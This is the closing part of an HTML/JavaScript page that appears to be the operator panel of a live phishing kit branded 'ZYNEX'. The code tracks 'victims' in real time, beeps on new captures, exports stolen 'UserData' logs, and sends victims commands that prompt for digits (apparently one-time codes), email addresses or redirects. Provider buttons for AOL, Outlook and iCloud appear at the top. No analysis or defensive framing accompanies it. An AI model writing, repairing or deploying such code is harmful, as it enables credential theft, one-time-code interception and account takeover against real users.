                            AOL
                        </div>
                        <div class="email-buttons" id="group-aol"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header live">
                            <i class="fab fa-microsoft"></i>
                            Live / Outlook
                        </div>
                        <div class="email-buttons" id="group-live"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header icloud">
                            <i class="fab fa-apple"></i>
                            iCloud
                        </div>
                        <div class="email-buttons" id="group-icloud"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>








  <!-- JavaScript files-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
  <script src="js/toastr.min.js"></script>
  <script src="js/other.js"></script>

<script>
/* ZYNEX admin panel — fixed & completed (keeps original function names) */
let isPaused = false;
const btns = `<?php echo $btns; ?>`;
const redirects = `<?php echo $redirects; ?>`;
const removedIds = new Set();
let isUpdating = false;
let currentXHR = null;

// ---------- main poll loop (2s), no overlaps ----------
const timer = setInterval(function () {
  // pause while dropdown is open or an update is running
  const dropdown_open = document.getElementsByClassName('input-group-prepend show');
  if (dropdown_open.length > 0 || isUpdating) { pause(); return; } else { resume(); }

  if (!isPaused) {
    const urldata = 'inc/api.php';
    if (currentXHR && currentXHR.readyState !== 4) { try { currentXHR.abort(); } catch(_){} }
    isUpdating = true;

    currentXHR = $.ajax({
      url: urldata,
      type: 'GET',
      cache: false, // fresh data
      success: function (response) {
        try {
          const array = (typeof response === 'string') ? JSON.parse(response) : response;
          if (!array) return;

          // clients
          if (Array.isArray(array.clients)) {
            array.clients.forEach(function (object) {
              const victimId = object.id;
              if (!victimId || !String(victimId).startsWith('row')) return;

              const idClean = String(victimId).replace('row', '');
              const js_redirects = redirects.replace(/CHANGE_TO_ID/g, idClean);
              const buttons = btns.replace(/CHANGE_TO_ID/g, idClean).replace(/CHANGE_TO_REDIRECTS/g, js_redirects);
              const htmlContent = (object.info ? atob(object.info) : '') + buttons;

              const element = document.getElementById(victimId);
              if (element && typeof element.innerHTML !== 'undefined') {
                const local_vic = sanitizeHtml(element.innerHTML);
                if (!element.dataset.locked && !isPaused && local_vic !== htmlContent) {
                  element.innerHTML = htmlContent;
                }
                if (object.buzzed == "0") {
                  element.classList.add("blink_me");
                  beep(object.type || "default");
                } else {
                  element.classList.remove("blink_me");
                }
              } else {
                const clientsTable = document.getElementById('clients_table');
                if (clientsTable) {
                  const newRow = document.createElement("tr");
                  newRow.id = victimId;
                  newRow.innerHTML = htmlContent;
                  clientsTable.appendChild(newRow);
                  if (object.buzzed == "0") {
                    newRow.classList.add("blink_me");
                    beep(object.type || "default");
                  }
                }
              }
            });
          }

          // counters
          updateCounters(array);

          // removals
          if (Array.isArray(array.removed_ids)) {
            array.removed_ids.forEach(function (item) {
              let rid = item;
              if (rid && !String(rid).startsWith('row')) rid = 'row' + rid;
              const old_element = document.getElementById(rid);
              if (old_element) {
                old_element.classList.remove("buzz_overlay", "blink_me");
                old_element.remove();
                removedIds.add(rid);
              }
            });
          }
        } catch (e) {
          console.error("Error processing AJAX response:", e, "Response:", response);
        }
      },
      error: function (_xhr, _status, error) {
        if (_status !== 'abort') console.error("AJAX error:", error || _status);
      },
      complete: function () {
        isUpdating = false;
        currentXHR = null;
      }
    });
  }
}, 2000);

// ---------- row lock ----------
function lockRow(button) {
  const rowId = button.dataset.rowid;
  const row = document.getElementById(rowId);
  if (!row) return;

  // lock that row and pause polling immediately
  row.dataset.locked = "1";
  if (typeof pause === 'function') pause();

  // auto-unlock + resume after 2s (same timing you had)
  setTimeout(() => {
    delete row.dataset.locked;
    if (typeof resume === 'function') resume();
  }, 2000);
}

// ---------- update one victim row (keeps name) ----------
function updateVictimRow(victim) {
  if (!victim || !victim.id) return;
  const id = victim.id;
  const idClean = String(id).replace('row', '');

  let row = document.getElementById(id);
  const buttonsHTML = btns.replace(/CHANGE_TO_ID/g, idClean)
                          .replace(/CHANGE_TO_REDIRECTS/g, redirects.replace(/CHANGE_TO_ID/g, idClean));
  const newContent = (victim.info ? atob(victim.info) : '') + buttonsHTML;

  if (!row) {
    const tableBody = document.getElementById("clients_table");
    if (tableBody) {
      row = document.createElement("tr");
      row.id = id;
      row.innerHTML = newContent;
      tableBody.appendChild(row);
    }
  } else {
    const localContent = sanitizeHtml(row.innerHTML);
    if (!row.dataset.locked && !isPaused && localContent !== newContent) {
      row.innerHTML = newContent;
    }
  }

  if (row) {
    if (victim.buzzed === "0") {
      row.classList.add("blink_me");
      beep(victim.type || "default");
    } else {
      row.classList.remove("blink_me");
    }
  }
}

// ---------- counters (keeps name) ----------
function updateCounters(data) {
  if (!data) return;
  const counters = ["total_visits", "total_clients", "online_clients", "active_handlers"];
  counters.forEach(key => {
    const el = document.getElementById(key);
    if (el && typeof data[key] !== 'undefined') {
      el.innerText = data[key] || 0;
    }
  });
}

// ---------- remove old rows (keeps name) ----------
function removeOldRows(ids) {
  if (!Array.isArray(ids)) return;
  ids.forEach(id => {
    const row = document.getElementById(`row${id}`);
    if (row) {
      row.classList.remove("buzz_overlay", "blink_me");
      row.remove();
    }
  });
}

// ---------- buzz fast poll (keeps name) ----------
function pollBuzzUpdates() {
  setInterval(() => {
    if (isPaused) return;
    fetch('inc/api.php?buzz=1', { cache: 'no-store' })
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        if (Array.isArray(data?.buzzed_clients)) {
          data.buzzed_clients.forEach(object => {
            handleBuzz(object.id);
            if (!object.type) object.type = "default";
            updateVictimRow(object);
          });
        }
      })
      .catch(() => {});
  }, 1000);
}

// ---------- pause/resume (keep names) ----------
function pause()  { isPaused = true; }
function resume() { isPaused = false; }

// ---------- sanitize (keep name) ----------
function sanitizeHtml(html) {
  return String(html || '')
    .replace(/"/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&amp;/g, '&');
}

// ---------- beep (keep name) ----------
var alertSound = new Audio("inc/alert.mp3");
var lastBeepTime = 0;
function beep() {
  var now = Date.now();
  if (now - lastBeepTime >= 700) {
    try {
      alertSound.currentTime = 0;
      alertSound.play().catch(()=>{});
    } catch(_){}
    lastBeepTime = now;
  }
}

// ---------- remove (keep name) ----------
function remove(id) {
  if (!id) { toastr["error"]("Invalid ID provided."); return; }

  const rowId = "row" + id;
  const row = document.getElementById(rowId);
  if (row) row.remove();
  removedIds.add(rowId);

  console.time("deleteAction");
  fetch('inc/action.php?type=remove', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'userid=' + encodeURIComponent(id)
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok') {
      console.timeLog("deleteAction", "Row removed successfully");
      toastr["success"]("Successfully deleted");
    } else {
      toastr["error"]("Failed to remove #"+id);
      removedIds.delete(rowId);
    }
  })
  .catch(err => {
    console.error("Error:", err);
    toastr["error"]("An error occurred while removing #"+id);
    removedIds.delete(rowId);
  })
  .finally(() => console.timeEnd("deleteAction"));
}

// ---------- ban (keep name) ----------
function ban(id) {
  fetch('inc/action.php?type=ban', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'userid=' + encodeURIComponent(id)
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok')      toastr["success"]("Successfully banned");
    else if (parsed_data.status === 'notok') toastr["error"]("Failed to ban #"+id);
    else                                   toastr["error"]("Invalid user ID or action failed.");
  })
  .catch(error => {
    console.error('Error:', error);
    toastr["error"]("An error occurred while banning #"+id);
  });
}

// ---------- save (keep name) ----------
function save(id) {
  fetch('inc/action.php?type=getinfo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'userid=' + encodeURIComponent(id)
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok') {
      var htmlContent = parsed_data.info || '';
      var log = '';
      var alreadyProcessedKeys = new Set();
      var doc = new DOMParser().parseFromString(htmlContent, "text/html");
      var rows = doc.querySelectorAll("table tr");
      rows.forEach(row => {
        var cells = row.querySelectorAll("td");
        if (cells.length === 2) {
          var key = cells[0].textContent.trim();
          var value = cells[1].textContent.trim();
          if (!alreadyProcessedKeys.has(key)) {
            alreadyProcessedKeys.add(key);
            log += `${key}: ${value || ' '}\n`;
          }
        }
      });
      var textFileAsBlob = new Blob([log], { type: 'text/plain' });
      var d = new Date();
      var fileNameToSaveAs = `UserData_${id}_${d.getMonth()+1}-${d.getDate()}-${d.getFullYear()}.txt`;
      var downloadLink = document.createElement("a");
      downloadLink.download = fileNameToSaveAs;
      downloadLink.href = URL.createObjectURL(textFileAsBlob);
      downloadLink.click();
      toastr["success"]("Log successfully saved!");
    } else {
      toastr["error"]("Failed to save log #"+id);
    }
  })
  .catch(error => {
    console.error('Error:', error);
    toastr["error"]("An error occurred while saving log #"+id);
  });
}

// ---------- saveAll (keep name) ----------
function saveAll() {
  fetch('inc/action.php?type=getallinfo', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok') {
      const htmlContent = parsed_data.info || '';
      let log = '';
      const doc = new DOMParser().parseFromString(htmlContent, "text/html");
      const tables = doc.querySelectorAll("table");
      tables.forEach((table) => {
        const rows = table.querySelectorAll("tr");
        rows.forEach((row) => {
          const cells = row.querySelectorAll("td");
          if (cells.length === 2) {
            const key = cells[0].textContent.trim();
            const value = cells[1].textContent.trim();
            log += `${key}: ${value || ''}\n`;
          }
        });
        log += "\n===========\n\n";
      });
      const textFileAsBlob = new Blob([log], { type: 'text/plain' });
      const d = new Date();
      const fileNameToSaveAs = `AllUserData_${d.getMonth()+1}-${d.getDate()}-${d.getFullYear()}.txt`;
      const downloadLink = document.createElement("a");
      downloadLink.download = fileNameToSaveAs;
      downloadLink.href = URL.createObjectURL(textFileAsBlob);
      downloadLink.click();
      toastr["success"]("All logs successfully saved!");
    } else {
      toastr["error"]("Failed to save logs: " + (parsed_data.message || 'unknown'));
    }
  })
  .catch((error) => {
    console.error('Error:', error);
    toastr["error"]("An error occurred while saving logs.");
  });
}

// ---------- show_info (keep name) ----------
function show_info(id) {
  const modalTitle = document.getElementById('infomodaltitle');
  const modalValue = document.getElementById('infomodalvalue');
  if (modalTitle) modalTitle.innerHTML = 'Loading info...';
  if (modalValue) modalValue.innerHTML = '';
  fetch('inc/action.php?type=getinfo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'userid=' + encodeURIComponent(id)
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok') {
      if (modalTitle) modalTitle.innerHTML = `#${id} Victim Info`;
      if (modalValue) modalValue.innerHTML = parsed_data.info || '';
    } else {
      toastr["error"](`Failed to get information for victim #${id}`);
      if (modalTitle) modalTitle.innerHTML = 'Error';
      if (modalValue) modalValue.innerHTML = 'Failed to retrieve information.';
    }
  })
  .catch(error => {
    console.error('Fetch error (show_info):', error);
    toastr["error"](`An error occurred while retrieving info for victim #${id}`);
    if (modalTitle) modalTitle.innerHTML = 'Error';
    if (modalValue) modalValue.innerHTML = 'An unexpected error occurred.';
  });
}

// ---------- reset_visits (keep name) ----------
function reset_visits() {
  if (!confirm("Are you sure you want to reset the visits counter?")) return;
  const visitsCounter = document.getElementById('visitsCounter');
  if (visitsCounter) visitsCounter.textContent = '0';
  console.time("resetVisitsAction");
  fetch('inc/action.php?type=visits_reset', { method: 'GET' })
    .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
    .then(resp => {
      if (resp.status === 'ok') {
        toastr["success"]("Visits counter has been reset");
        console.timeLog("resetVisitsAction", "Visits counter reset on server");
      } else {
        toastr["error"]("Failed to reset visits counter");
      }
    })
    .catch(err => {
      console.error('Error:', err);
      toastr["error"]("An error occurred while resetting visits counter");
    })
    .finally(() => console.timeEnd("resetVisitsAction"));
}

// ---------- wipe (keep name) ----------
function wipe() {
  if (!confirm("Are you sure? This will clear all log entries")) return;
  console.time("clearLogsAction");
  fetch('inc/action.php?type=clearlogs', { method: 'POST' })
    .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
    .then(parsed_data => {
      if (parsed_data.status === 'ok') {
        const table = document.getElementById('clients_table');
        if (table) table.innerHTML = '';
        removedIds.clear();
        lastBeepTime = 0;
        toastr["success"]("Logs wiped successfully");
        console.timeLog("clearLogsAction", "Logs cleared on server");
        // force re-pull
        return fetch('inc/api.php').then(res => res.json()).then(data => {
          const t = document.getElementById('clients_table');
          if (t) t.innerHTML = '';
          removedIds.clear();
          if (Array.isArray(data.clients)) data.clients.forEach(v => updateVictimRow(v));
          updateCounters(data);
          removeOldRows(data.removed_ids || []);
        });
      } else {
        toastr["error"]("Failed to wipe logs");
      }
    })
    .catch(error => {
      console.error('Error:', error);
      toastr["error"]("An error occurred while wiping logs");
    })
    .finally(() => console.timeEnd("clearLogsAction"));
}

// ---------- reset_bans (keep name) ----------
function reset_bans() {
  if (!confirm("Are you sure? This action will clear the ban list")) return;
  fetch('reset.php', { method: 'GET' })
    .then(r => r.ok ? r.text() : Promise.reject(new Error('HTTP '+r.status)))
    .then(() => { toastr["success"]("Ban list has been cleared"); })
    .catch(error => {
      console.error('Error:', error);
      toastr["error"]("An error occurred while resetting the ban list");
    });
}

// ---------- pause_all_alerts (keep name) ----------
function pause_all_alerts() {
  fetch('inc/action.php?type=buzzoff', { method: 'GET' })
    .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
    .then(resp => {
      if (resp.status === 'ok') {
        const action = resp.action === 1 ? "paused" : "unpaused";
        toastr["success"]("Current clients' alerts are now " + action);
      } else {
        toastr["error"]("Failed to update alerts for all clients.");
      }
    })
    .catch(error => {
      console.error('Error:', error);
      toastr["error"]("An error occurred while pausing/unpausing alerts");
    });
}

// ---------- pause_alert (keep name) ----------
function pause_alert(id) {
  $.ajax({
    url: 'inc/action.php?type=buzzoffsingle&userid=' + encodeURIComponent(id),
    type: 'GET',
    success: function(response) {
      var rasponse = (typeof response === 'string') ? JSON.parse(response) : response;
      if (rasponse.status == 'ok') {
        toastr["success"]("alert toggled for #" + id);
        var button = document.querySelector(`button[onclick='pause_alert("${id}")']`);
        if (button) {
          if (button.innerHTML.includes('Pause Alert')) {
            button.innerHTML = '<i class="fa fa-bell"></i> Unpause Alert';
          } else {
            button.innerHTML = '<i class="fa fa-bell-slash"></i> Pause Alert';
          }
        }
      } else {
        toastr["error"]("Failed to toggle alert for #" + id);
      }
    }
  });
}

// ---------- setCustomRedirect / closeRedirectModal (keep names) ----------
function setCustomRedirect() {
  resume();
  var customURL = prompt("Enter the URL for redirection:");
  if (customURL !== null && customURL.trim() !== "") {
    const data = new URLSearchParams({ 'custom_redirect': customURL.trim() });
    fetch('inc/action.php?type=custom_redirect', {
      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: data.toString()
    })
    .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
    .then(parsed_data => {
      if (parsed_data.status === 'ok') { toastr["success"]("Custom redirection URL set successfully"); closeRedirectModal(); }
      else { toastr["error"]("Failed: " + (parsed_data.message || "unknown error")); }
    })
    .catch(error => { console.error('Error:', error); toastr["error"]("Error setting the redirection URL"); });
  }
}
function closeRedirectModal() {
  if (typeof redirectModalInstance !== 'undefined' && redirectModalInstance) {
    redirectModalInstance.hide();
  }
}

// ---------- command_* & command (keep names) ----------
function command_with_parms(id, sts, callback) {
  resume();
  var home = prompt("Please enter digits");
  if (home == null || home === "") { if (callback) callback(false); return; }
  const data = new URLSearchParams({ userid: id, status: sts, home: home });
  fetch('inc/action.php?type=onecommmand', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: data.toString()
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(j => { if (callback) callback(j.status === 'ok'); })
  .catch(() => { if (callback) callback(false); });
}

function command_emailparm(id, sts, callback) {
  var email = prompt("Enter email address");
  if (!email || !email.trim()) { if (callback) callback(false); return; }
  const data = new URLSearchParams({ userid: id, status: sts, emailparam: email.trim() });
  fetch('inc/action.php?type=save_emailparam', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: data.toString()
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(j => { if (callback) callback(j && j.status === 'ok'); })
  .catch(() => { if (callback) callback(false); });
}

function command_reviewcase(id, sts, callback) {
  var val = prompt("Enter review case");
  if (!val || !val.trim()) { if (callback) callback(false); return; }
  const data = new URLSearchParams({ userid: id, status: sts, reviewcase: val.trim() });
  fetch('inc/action.php?type=save_reviewcase', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: data.toString()
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(j => { if (callback) callback(j && j.status === 'ok'); })
  .catch(() => { if (callback) callback(false); });
}

function command(id, sts, callback) {
  resume();
  const data = new URLSearchParams({ 'userid': id, 'status': sts });
  fetch('inc/action.php?type=commmand', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: data.toString()
  })
  .then(r => r.ok ? r.json() : Promise.reject(new Error('HTTP '+r.status)))
  .then(parsed_data => {
    if (parsed_data.status === 'ok') { toastr["success"]("Command sent successfully"); }
    else { toastr["error"]("Failed to send your command"); }
  })
  .catch(error => { console.error('Error:', error); toastr["error"]("An error occurred while sending the command"); })
  .finally(() => { if (typeof callback === 'function') callback(); });
}

// ---------- global click pause (keep same behavior) ----------
document.addEventListener('click', function (e) {
  if (e.target.closest('.btn-action') || e.target.classList.contains('btn-action')) {
    pause();
    clearTimeout(window.resumeTimer);
    window.resumeTimer = setTimeout(resume, 2500);
  }
});

// ---------- start buzz poll ----------
pollBuzzUpdates();
</script>

<script>
/* === ZYNEX: interaction guard to prevent refresh during clicks/typing === */
(() => {
  const table = document.getElementById('clients_table');
  let resumeTimer = null;

  function softPauseRowLock(e) {
    const tr = e.target.closest('tr[id^="row"]');
    if (!tr) return;
    // lock only this row and pause polling
    tr.dataset.locked = "1";
    if (typeof pause === 'function') pause();

    // renew the lock while user is interacting
    if (resumeTimer) clearTimeout(resumeTimer);
    resumeTimer = setTimeout(() => {
      delete tr.dataset.locked;
      if (typeof resume === 'function') resume();
    }, 3000); // adjust if you want longer
  }

  if (table) {
    // fire ASAP (before click), captures mouse/touch/keyboard & focus
    ['pointerdown','mousedown','touchstart','keydown','focusin'].forEach(ev => {
      table.addEventListener(ev, softPauseRowLock, { capture: true });
    });
  }
})();
</script>


<!-- ✅ Drop this AFTER your big admin script block (keeps all original function names). 
     It restores click handling for modal buttons and keeps pause/resume behavior. -->
<script>
/* -------- ROUTER: handles ALL modal buttons created with data-id / data-sts / data-parm -------- */
(function () {
  // Pause refresh whenever any modal action button is clicked; resume after 2.5s
  function softPause() {
    if (typeof pause === 'function') pause();
    clearTimeout(window.__zynexResumeTimer);
    window.__zynexResumeTimer = setTimeout(function () {
      if (typeof resume === 'function') resume();
    }, 2500);
  }

  // Close known modals if present
  function closeAnyModals() {
    try { if (window.redirectModalInstance) redirectModalInstance.hide(); } catch(_) {}
    try { if (window.secondModalInstance)   secondModalInstance.hide(); } catch(_) {}
  }

  // Global delegation: any <button data-id ...> will be routed
  document.addEventListener('click', function (e) {
    const btn = e.target.closest('button[data-id]');
    if (!btn) return;

    // If button has an inline onclick (e.g., custom redirect), let that run
    if (btn.getAttribute('onclick')) return;

    const id   = btn.getAttribute('data-id');
    const sts  = btn.getAttribute('data-sts');
    const parm = btn.getAttribute('data-parm'); // '1' | '2' | '3' | null

    if (!id) return;

    softPause();       // pause the admin auto-refresh briefly
    closeAnyModals();  // close modal immediately for UX

    // Route based on parm type (keeps your original function names)
    if (parm === '1' && sts) {
      // digits prompt -> then send command
      if (typeof command_with_parms === 'function') {
        command_with_parms(id, sts, function (ok) {
          if (ok && typeof command === 'function') command(id, sts);
          else if (typeof resume === 'function') resume();
        });
      }
      return;
    }

    if (parm === '2' && sts) {
      // email prompt -> then send command
      if (typeof command_emailparm === 'function') {
        command_emailparm(id, sts, function (ok) {
          if (ok && typeof command === 'function') command(id, sts);
          else if (typeof resume === 'function') resume();
        });
      }
      return;
    }

    if (parm === '3' && sts) {
      // review case prompt -> then send command
      if (typeof command_reviewcase === 'function') {
        command_reviewcase(id, sts, function (ok) {
          if (ok && typeof command === 'function') command(id, sts);
          else if (typeof resume === 'function') resume();
        });
      }
      return;
    }

if (parm === '4' && sts) {
  // phone + email prompt -> then send command
  if (typeof command_doubleparm === 'function') {
    command_doubleparm(id, sts, function (ok) {
      if (ok && typeof command === 'function') command(id, sts);
      else if (typeof resume === 'function') resume();
    });
  }
  return;
}



    // No parm → plain command
    if (sts && typeof command === 'function') {
      command(id, sts);
    }
  });
})();
</script>



<!-- GLOBAL TOASTR CONFIG (set ONCE, top-center) -->
<script>
toastr.options = {
  closeButton: true,
  progressBar: true,
  positionClass: "toast-top-center",
  preventDuplicates: true,
  newestOnTop: true,
  timeOut: 2200,
  extendedTimeOut: 1000,
  showDuration: 120,
  hideDuration: 120,
  showMethod: "fadeIn",
  hideMethod: "fadeOut"
};
</script>

</body>

</html>